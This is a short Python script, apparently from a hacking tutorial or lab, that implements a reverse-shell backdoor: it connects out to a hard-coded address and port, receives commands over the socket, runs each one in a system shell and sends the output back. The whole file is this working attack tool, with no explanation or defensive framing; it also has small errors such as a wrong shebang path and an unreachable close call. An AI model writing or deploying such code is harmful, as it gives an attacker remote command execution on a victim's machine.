 #!/user/bin/env python
import socket
import subprocess


class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True).decode()

	def  run(self):
		while True:
			command = self.connection.recv(1024)
			command_data = self.execute_system_command(command.decode("utf-8"))
			self.connection.send(command_data.encode("utf-8"))
		connection.close()


backdoor = Backdoor("192.168.146.149", 1337)
backdoor.run()
